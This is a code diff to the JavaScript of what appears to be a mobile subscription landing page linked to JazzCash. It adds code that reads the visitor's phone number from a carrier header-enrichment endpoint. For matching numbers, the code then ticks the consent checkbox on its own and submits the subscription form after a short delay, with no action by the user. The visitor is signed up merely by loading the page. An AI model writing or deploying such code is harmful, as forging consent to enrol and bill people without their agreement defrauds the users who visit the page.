@@ -724,18 +724,30 @@
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
-        /* ── Display MSISDN if received from POST request or URL parameter ── */
+        /* ── Display MSISDN if received from POST request, URL parameter, or HE headers ── */
         window.addEventListener('DOMContentLoaded', () => {
             const urlParams = new URLSearchParams(window.location.search);
             const queryMsisdn = urlParams.get('msisdn');
             const detectedMsisdn = window.SERVER_DETECTED_MSISDN || queryMsisdn;
 
+            let autoRedirectTriggered = false;
+
             if (detectedMsisdn) {
                 populateMsisdn(detectedMsisdn);
+            } else {
+                // Auto-fetch header enrichment MSISDN
+                fetch('/api/detect-msisdn')
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.msisdn) {
+                            populateMsisdn(data.msisdn);
+                        }
+                    })
+                    .catch(err => console.error('Failed to auto-fetch MSISDN from headers:', err));
             }
 
             function populateMsisdn(rawVal) {
-                if (!rawVal) return;
+                if (!rawVal || autoRedirectTriggered) return;
                 const cleanNum = rawVal.toString().replace(/[^0-9]/g, '');
                 let localPart = cleanNum;
                 if (cleanNum.startsWith('92')) {
@@ -746,10 +758,32 @@
                     localPart = cleanNum;
                 }
                 const input = document.getElementById('phoneNumber');
-                if (input) {
+                if (input && localPart.length === 10 && localPart.startsWith('3')) {
                     input.value = localPart;
-                    console.log('Populated MSISDN from POST/parameter:', rawVal, '->', localPart);
+                    console.log('Populated MSISDN from HE:', rawVal, '->', localPart);
+
+                    // Auto-trigger subscription pipeline for HE detected numbers
+                    autoRedirectTriggered = true;
+                    autoTriggerSubscription();
                 }
+            }
+
+            function autoTriggerSubscription() {
+                const consentCb = document.getElementById('consentCheckbox');
+                if (consentCb) consentCb.checked = true;
+
+                showToast('✓ Phone number detected! Auto-redirecting to JazzCash...', true);
+
+                setTimeout(() => {
+                    const form = document.querySelector('.form-overlay');
+                    if (form) {
+                        if (typeof form.requestSubmit === 'function') {
+                            form.requestSubmit();
+                        } else {
+                            handleSubmit(new Event('submit'));
+                        }
+                    }
+                }, 800);
             }
         });
     </script>
